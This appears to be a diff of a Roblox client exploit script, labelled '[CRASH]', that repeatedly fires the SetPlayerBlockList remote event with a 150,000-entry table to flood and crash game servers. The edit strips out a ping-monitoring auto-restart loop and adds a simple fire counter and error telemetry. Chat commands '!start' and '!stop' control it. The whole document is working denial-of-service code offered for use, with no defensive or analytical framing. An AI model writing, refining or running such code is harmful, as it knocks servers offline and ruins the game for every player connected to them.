@@ -1,62 +1,26 @@
 --!nonstrict
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
-local Stats = game:GetService("Stats")
 
 local player = Players.LocalPlayer
 
--- ═══════════ CONFIG ═══════════
-local Children       = 150000
-local NestedPerChild = 0
-local FieldsPerChild = 0
-local FireBurst      = 1.5
-local FrameDelay     = 0.125
-local FieldSize      = 0
-local Format         = "pair"
-
-local BASELINE_SAMPLES = 6      -- samples to measure un-lagged baseline
-local PING_CHECK_EVERY = 1.5    -- seconds between ping checks
-local PING_CALM_CHECKS = 3      -- consecutive calm checks → restart
-local RESTART_DELAY    = 1.0    -- seconds between stop and start
--- ══════════════════════════════
+-- ═══════════ EXACT SAME AS ORIGINAL WORKING CONFIG ═══════════
+local Children    = 150000
+local FireBurst   = 1.5
+local FrameDelay  = 0.125
 
 local RemoteCandidates = {
     { "RobloxReplicatedStorage", "SetPlayerBlockList" },
     { "ReplicatedStorage",       "SetPlayerBlockList" },
 }
+-- ══════════════════════════════════════════════════════════════
 
-local state = {
-    running = false,
-    cache = nil,
-    remote = nil,
-    fires = 0,
-    lastFire = 0,
-}
+local running = false
+local cache = nil
+local remote = nil
+local fires = 0
+local errors = 0
 
--- ═══════════ PING ═══════════
-local function getPing()
-    -- Primary: Stats Data Ping
-    local ok, ping = pcall(function()
-        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
-    end)
-    if ok and type(ping) == "number" and ping > 0 then return ping end
-
-    -- Secondary: GetNetworkPing
-    ok, ping = pcall(function()
-        return player:GetNetworkPing() * 1000
-    end)
-    if ok and type(ping) == "number" and ping > 0 then return ping end
-
-    -- Tertiary: older API
-    ok, ping = pcall(function()
-        return Stats.Network.ServerStatsItem["Data Ping"].Value
-    end)
-    if ok and type(ping) == "number" then return ping end
-
-    return nil
-end
-
--- ═══════════ REMOTE ═══════════
 local function resolve()
     for _, path in ipairs(RemoteCandidates) do
         local node, ok = game, true
@@ -65,11 +29,13 @@ local function resolve()
             if not nxt then ok = false; break end
             node = nxt
         end
-        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
-            return node
+        if ok and node then
+            if node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent") then
+                return node, path[1] .. "/" .. path[2]
+            end
         end
     end
-    return nil
+    return nil, "not found"
 end
 
 pcall(function()
@@ -77,152 +43,91 @@ pcall(function()
 end)
 
 local function build()
-    local n = Children
-    local root = table.create(n)
-    if Format == "flat" then
-        for i = 1, n do root[i] = i end
-        return root
-    end
-    if Format == "compact" then
-        for i = 1, n do root[i] = { i, i * 2 } end
-        return root
-    end
-    local pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
-    for i = 1, n do
-        local entry = { id = i, v = i * 2 }
-        for k = 1, FieldsPerChild do
-            entry["k" .. k] = (FieldSize > 0) and pad or (i + k)
-        end
-        for j = 1, NestedPerChild do
-            entry["n" .. j] = { a = i, b = j }
-        end
-        root[i] = entry
+    local root = table.create(Children)
+    for i = 1, Children do
+        root[i] = { id = i, v = i * 2 }
     end
     return root
 end
 
--- ═══════════ FIRE LOOP ═══════════
-local function fireLoop()
-    if not state.cache then state.cache = build() end
+local function runLoop()
+    cache = build()
+    print("[CRASH] payload built:", #cache, "entries")
 
-    while state.running do
-        local ok = pcall(function()
-            if not state.remote then state.remote = resolve() end
-            if not state.remote then error("no remote", 0) end
-            for _ = 1, FireBurst do
-                state.remote:FireServer(state.cache)
+    while running do
+        if not remote then
+            local r, where = resolve()
+            remote = r
+            if r then
+                print("[CRASH] remote found:", where)
+            else
+                print("[CRASH] remote NOT FOUND — waiting")
             end
-        end)
-        if ok then
-            state.fires += 1
-            state.lastFire = tick()
-        else
-            state.remote = nil
         end
+
+        if remote then
+            local ok = pcall(function()
+                for _ = 1, FireBurst do
+                    remote:FireServer(cache)
+                end
+            end)
+            if ok then
+                fires += 1
+                errors = 0
+            else
+                errors += 1
+                remote = nil
+            end
+        end
+
         task.wait(FrameDelay)
     end
 end
 
--- ═══════════ START / STOP ═══════════
 local function start()
-    if state.running then return end
-    state.running = true
-    state.fires = 0
-    state.lastFire = tick()
-    state.remote = nil
-    state.cache = nil
-    task.spawn(fireLoop)
-    print("[CRASH] running")
+    if running then return end
+    running = true
+    remote = nil
+    fires = 0
+    errors = 0
+    task.spawn(runLoop)
+    print("[CRASH] STARTED")
 end
 
 local function stop()
-    if not state.running then return end
-    state.running = false
-    state.cache = nil
-    state.remote = nil
-    print("[CRASH] halted")
+    if not running then return end
+    running = false
+    cache = nil
+    remote = nil
+    print("[CRASH] STOPPED — total fires:", fires)
 end
 
--- ═══════════ PING MONITOR + AUTO RESTART ═══════════
-local started = false
-local pingBaseline = nil
-local wasLagging = false
-local calmCounter = 0
-local lastRestart = 0
-
+-- telemetry
 task.spawn(function()
+    local last = 0
     while true do
-        task.wait(PING_CHECK_EVERY)
-        if started and pingBaseline then
-            local p = getPing()
-            if p then
-                local threshold = math.max(60, pingBaseline * 0.5)
-                local lagging = p > (pingBaseline + threshold)
-
-                if lagging then
-                    wasLagging = true
-                    calmCounter = 0
-                elseif wasLagging then
-                    calmCounter += 1
-                    if calmCounter >= PING_CALM_CHECKS
-                    and (tick() - lastRestart) > 3 then
-                        calmCounter = 0
-                        wasLagging = false
-                        lastRestart = tick()
-                        print(string.format(
-                            "[CRASH] un-lag detected (ping %dms, baseline %dms) — killing and restarting",
-                            math.floor(p), math.floor(pingBaseline)
-                        ))
-                        pcall(stop)
-                        task.spawn(function()
-                            task.wait(RESTART_DELAY)
-                            if started then pcall(start) end
-                        end)
-                    end
-                end
-            end
+        task.wait(5)
+        if running then
+            local delta = fires - last
+            last = fires
+            print(string.format("[CRASH] fires=%d (+%d/5s) errors=%d remote=%s",
+                fires, delta, errors, remote and "yes" or "NO"))
+        else
+            last = 0
         end
     end
 end)
 
--- ═══════════ CHAT ═══════════
+local started = false
+
 local function onMessage(msg)
     local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
-    if m == "!start" then
-        if not started then
-            started = true
-            pingBaseline = nil
-            wasLagging = false
-            calmCounter = 0
-            print("[CRASH] !start — measuring baseline ping...")
-            task.spawn(function()
-                local samples = {}
-                for i = 1, BASELINE_SAMPLES do
-                    local p = getPing()
-                    if p then table.insert(samples, p) end
-                    task.wait(0.3)
-                end
-                if #samples > 0 then
-                    table.sort(samples)
-                    pingBaseline = samples[1]
-                    print(string.format(
-                        "[CRASH] baseline = %d ms — will kill+restart when ping returns to this",
-                        math.floor(pingBaseline)
-                    ))
-                else
-                    print("[CRASH] could not measure baseline — running without auto-restart")
-                end
-                if started then
-                    pcall(start)
-                end
-            end)
-        end
-    elseif m == "!stop" then
-        if started then
-            started = false
-            pcall(stop)
-            print("[CRASH] !stop — auto-restart disabled")
-        end
+    if m == "!start" and not started then
+        started = true
+        pcall(start)
+    elseif m == "!stop" and started then
+        started = false
+        pcall(stop)
     end
 end
 
